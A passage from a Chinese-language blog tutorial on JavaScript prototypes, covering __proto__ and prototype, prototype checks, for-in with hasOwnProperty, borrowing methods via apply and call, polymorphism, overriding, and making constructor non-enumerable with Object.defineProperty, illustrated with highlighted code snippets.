class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构造函数，我们新建一个对象zhangsan</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> zhangsan = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>现在我们想新建另一个对象李四，让它直接继承于张三（也就是张三的儿子），我们可以这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> zhangsan = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">let</span> lisi = &#123;&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(lisi, zhangsan)</span><br><span class="line">lisi.<span class="property">name</span> = <span class="string">&#x27;李四&#x27;</span></span><br></pre></td></tr></table></figure><p>ok，这样我们就简单的实现了继承，然后，提出一个问题，张三、李四以及构造函数User之间的关系是怎样的（通过上图理解）</p><p>弄清楚之后，你便会对__proto__、prototype、原型继承、原型和原型链有了更深刻的理解(下面是答案，记住一点，prototype是构造函数独有的，对象并没有这个属性，且这个属性指向构造函数原型)</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF.png" alt="原型继承"></p><p>通过这张图，我们也可以知道</p><p><code>User.prototype.constructor() === User()</code></p><p>也就是说，你也可以通过<code>new User.prototype.constructor()</code>创建对象，当然正常人不会这样做（麻烦）</p><h1 id="构造函数-对象的原型检测"><a href="#构造函数-对象的原型检测" class="headerlink" title="构造函数/对象的原型检测"></a>构造函数/对象的原型检测</h1><p>我们想要对某一个对象的原型进行判断，有两种方法，一种是通过判断构造函数，另一种则是直接判断对象</p><p>首先我们声明三个类、定义它们间的关系以及实例化出各自的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">C</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title function_">A</span>()</span><br><span class="line">B.<span class="property"><span class="keyword">prototype</span></span> = a</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title function_">B</span>()</span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span> = b</span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> <span class="title function_">C</span>()</span><br></pre></td></tr></table></figure><ol><li><p>instanceof方法（构造函数）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b <span class="keyword">instanceof</span> B)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c <span class="keyword">instanceof</span> A)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c <span class="keyword">instanceof</span> B)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c <span class="keyword">instanceof</span> C)</span><br></pre></td></tr></table></figure><p>结果都为真</p></li><li><p>dad isPrototypeOf(son)（对象）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">isPrototypeOf</span>(b))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="title function_">isPrototypeOf</span>(c))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">isPrototypeOf</span>(c))</span><br></pre></td></tr></table></figure><p>结果也都为真</p></li></ol><p>两个方法都会循着原型链向上找，唯一不同的便是instanceof需要传入构造函数，而另一个方法则是传入对象</p><h1 id="原型链中的对象遍历"><a href="#原型链中的对象遍历" class="headerlink" title="原型链中的对象遍历"></a>原型链中的对象遍历</h1><p>首先胡乱设置两个对象，同时这两个对象有继承关系</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  <span class="title function_">A</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;我叫&quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b.<span class="property">__proto__</span> = a</span><br></pre></td></tr></table></figure><p>好的，也就是说a是b的爸爸，然后我们来遍历一下b对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> b) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是什么(name 、age、A())</p><p>由此我们可以得出：in遍历是会遍历出包含原型链上其它原型的属性方法，那么如果我们只是想要遍历b独有的方法呢</p><p>这时候可以利用hasOwnProperty()方法去判断方法属性是否属于当前调用对象独有的，使用方式如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被检测对象.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;key&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所以我们就可以使用for_in循环遍历出当前对象的属性方法了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> b) &#123;</span><br><span class="line">  <span class="comment">// 判断当前属性是否为当前对象独有</span></span><br><span class="line">  <span class="keyword">if</span> (b.<span class="title function_">hasOwnProperty</span>( key)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key)   </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出的结果就是b自己独有的属性方法啦</p><h1 id="借用其他原型链方法"><a href="#借用其他原型链方法" class="headerlink" title="借用其他原型链方法"></a>借用其他原型链方法</h1><p>现在我们有个数组arr，当有个需求要我们求出这个数组的最大值时，你会咋做嘞</p><p>有些人可能会这样做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a,b</span>) =&gt;</span> b - a)[<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也有可能这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">v, c</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> c &gt; v ? c : v</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>但是嘞，这些都是基于数组原型的方法实现的，声明的数组类型本来就是指向该原型的，那如果这时候我想调用Math里面的方法去实现这一需求，Math.max()方法不需要上面那么复杂的逻辑实现，更简单有木有，但是要如何做呢</p><p>这时候我们就要用到apply或call方法啦（两个函数都可以改变方法的this指向）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, arr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样得出来的结果也是一样的，更简单明了是不，他的原理便是改变原函数max的指向，使得我们可以调用不处于同一条原型链的其它对象的方法</p><p>再来一个例子，我们利用数组的过滤来对Dom进行操作，需求是这样的：给出两个input控件，我们想要获得指定的控件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">value</span>=<span class="string">&quot;我是a&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span> <span class="attr">value</span>=<span class="string">&quot;我是b&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们想要获得name=a的元素，怎么做呢，很简单：1.获取所有input控件 2.调用数组的filter方法进行过滤筛选</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ts = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;[v-model]&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> res = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">filter</span>.<span class="title function_">call</span>(ts, <span class="function"><span class="params">e</span> =&gt;</span> e.<span class="title function_">getAttribute</span>(<span class="string">&#x27;name&#x27;</span>) === <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="comment">//下面的方法也行</span></span><br><span class="line"><span class="comment">// let res = [].filter.call(ts,e =&gt; e.getAttribute(&#x27;name&#x27;) === &#x27;a&#x27;)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res[<span class="number">0</span>].<span class="property">value</span>)</span><br></pre></td></tr></table></figure><h1 id="构造函数原型方法和构造函数内的方法"><a href="#构造函数原型方法和构造函数内的方法" class="headerlink" title="构造函数原型方法和构造函数内的方法"></a>构造函数原型方法和构造函数内的方法</h1><p>从前面我们可以知道，用构造函数实例化出来的对象，他的原型是构造函数的prototype属性，那么当我们给构造函数的prototype对象添加方法时，这个实例化出来的对象也可以使用该方法，那要是将一个对象的__proto__指向该构造函数的prototype时，它是否可以使用构造函数内部定义的方法呢，让我们看一下</p><p>首先定义一个构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">User</span> = <span class="keyword">function</span>(<span class="params">name, age= <span class="number">18</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我叫&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给它的原型新增方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getAge</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">age</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化一个对象，并分别调用构造函数内的方法和构造函数prototype的方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user1 = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;user1&#x27;</span>, <span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user1.<span class="title function_">getAge</span>())</span><br><span class="line">user1.<span class="title function_">getName</span>()</span><br></pre></td></tr></table></figure><p>结果都可以正常显示</p><p>接着我们直接定义另一个对象，并强制将其原型指向User.prototype</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user3 = &#123;&#125;</span><br><span class="line">user3.<span class="property">__proto__</span> = <span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><p>调用getAge()方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user3.<span class="title function_">getAge</span>())</span><br></pre></td></tr></table></figure><p>正常显示，调用getName()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user3.getName()</span><br></pre></td></tr></table></figure><p>无法执行，程序报错，显示该错误：user3.getName is not a function</p><p>所以由此我们可以得出，构造函数内部定义的方法，只有在由他实例化出来的对象才会得到，而将一个自定义对象原型指向该构造函数的prototype对象时，是无法使用该构造函数内部的方法的，但是毫无疑问的，它可以使用该构造函数的prototype对象内的方法</p><h1 id="设置和获得原型"><a href="#设置和获得原型" class="headerlink" title="设置和获得原型"></a>设置和获得原型</h1><p>上面我们可以知道，设置对象的原型可以直接使用obj.__proto__属性强制绑定，下面是Object自带的两个方法进行原型设置以及获得当前对象的原型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置原型</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(son, dad)</span><br></pre></td></tr></table></figure><p>该方法和son.__proto__ = dad一致</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得原型</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(son)</span><br></pre></td></tr></table></figure><p>使用该方法即可获得他爹了</p><h1 id="proto-原理（get、set）"><a href="#proto-原理（get、set）" class="headerlink" title="__proto__原理（get、set）"></a>__proto__原理（get、set）</h1><p>不知道你们有没有试过，将对象的__proto__属性定义成出对象外的其它值类型数据是不可行的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj =&#123;&#125;</span><br><span class="line">obj.<span class="property">__proto__</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这样是没有任何效果的，为什么呢，因为__proto__实际上是访问器(get/set)构造而成的，他会对设置的值进行过滤，只有符合对象类型的数据，它才会赋值，让我们来仿造一个，了解其实质</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Obj</span>  = &#123;</span><br><span class="line">  <span class="attr">obj</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;obj&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">_proto_</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">obj</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">_proto_</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(e <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">obj</span> = e</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Obj</span>.<span class="property">_proto_</span> = <span class="number">3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Obj</span>.<span class="property">_proto_</span>);</span><br></pre></td></tr></table></figure><p>核心代码便是<code>e instanceof Object</code>，即判断当前传入类型是否为对象，是则赋值成功，否则忽略该赋值</p><h1 id="基于原型面向对象的多态"><a href="#基于原型面向对象的多态" class="headerlink" title="基于原型面向对象的多态"></a>基于原型面向对象的多态</h1><p>js也可以多态，你没骗我吧，没有的事呢，那就让我们来看看js的多态究竟是个啥</p><p>假设现在有个情况，你家里来客人了，你爸叫你和你妹跟客人打招呼，你说了句“叔叔好，我是我爸的儿子jie（假设你叫jie）”，你妹说：“叔叔好，我是我爸的女儿hua（假设你妹叫hua）”</p><p>看到没有，同样的一个行为，哥哥和妹妹的表现是不同的，这便是多态。让我们用代码实现一下</p><p>首先定义爸爸构造函数，然后 给爸爸原型定义一个介绍的方法（毕竟指令由爹地发出的）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">introduction</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="title function_">show</span>());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着构造儿子，并继承于老爸，然后定义儿子的介绍方法show()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使得Son.prototype.__proto__指向Father.prototype</span></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;我是儿子&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来就是女儿，和儿子一样，但是其show()方法和儿子有所不同</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Daughter</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Daughter</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Daughter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;我是女儿&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就是实例化一个儿子和女儿</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jie = <span class="keyword">new</span> <span class="title class_">Son</span>(<span class="string">&#x27;jie&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> hua = <span class="keyword">new</span> <span class="title class_">Daughter</span>(<span class="string">&#x27;hua&#x27;</span>)</span><br></pre></td></tr></table></figure><p>假设此时他们接收到了父亲的指令，于是乎分别调用introduction方法并介绍自己</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jie.<span class="title function_">introduction</span>() <span class="comment">//我是儿子jie</span></span><br><span class="line">hua.<span class="title function_">introduction</span>() <span class="comment">//我是女儿hua</span></span><br></pre></td></tr></table></figure><p>这便是js的多态实现</p><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>没啥好说的，就是继承父类的方法，但是由自己的实现方式，需要重新定义，这便是重写，直接理解代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个father构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">hi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;father hi&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建son对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化爹地</span></span><br><span class="line"><span class="keyword">let</span> father = <span class="keyword">new</span> <span class="title class_">Father</span>();</span><br><span class="line"><span class="comment">// 让son的原型指向爹地对象</span></span><br><span class="line">son = <span class="title class_">Object</span>.<span class="title function_">create</span>(father);</span><br><span class="line">son.<span class="title function_">hi</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写son方法</span></span><br><span class="line">son.<span class="property">hi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;son hi&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">son.<span class="title function_">hi</span>();</span><br></pre></td></tr></table></figure><h1 id="禁止自定义函数原型的constructor被遍历"><a href="#禁止自定义函数原型的constructor被遍历" class="headerlink" title="禁止自定义函数原型的constructor被遍历"></a>禁止自定义函数原型的constructor被遍历</h1><p>之前我们已经了解过consructor，它是构造函数原型里面指向构造函数的一个属性，如下，两者是等价的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">User</span></span><br></pre></td></tr></table></figure><p>但当我们想让一个构造函数的原型继承于另一个构造函数时，会发生一点意外</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;father hi&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;son&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Father</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里面，我们让Son的prototype原型指向Father.prototype，看起来好像一切都正常，也不影响继承，但是仔细观察你会发现，里面的constructor不见了，通过打印<code>console.dir(Son.prototype)</code>，我们可以发现它的constructor确实不见了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528202637586.png" alt="image-20210528202637586"></p><p>这会造成什么问题，你会无法通过下列方法实例化对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">constructor</span>(<span class="params"></span>);</span><br></pre></td></tr></table></figure><p>所以，为了避免它原先的constructor丢失造成的问题，我们需要把它纠正回来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Son</span>;</span><br></pre></td></tr></table></figure><p>OK啦，只要在每次继承之后加上这句代码，就可以防止constructor丢失了，但其实在这里，还会有一个问题，让我们来遍历一下这个原型对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> <span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会得到什么结果：hi以及constructor，我们希望constructor出现吗，并不会，我们希望这些原本对象自带的属性是隐藏且不可遍历的，但是在这里，我们将原本丢失的自带构造器添加上去，导致其暴露并可以遍历出来，所以我们要将其可枚举的属性设置为false，如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 禁止自定义函数原型的constructor被遍历</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;constructor&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="title class_">Son</span>,</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span 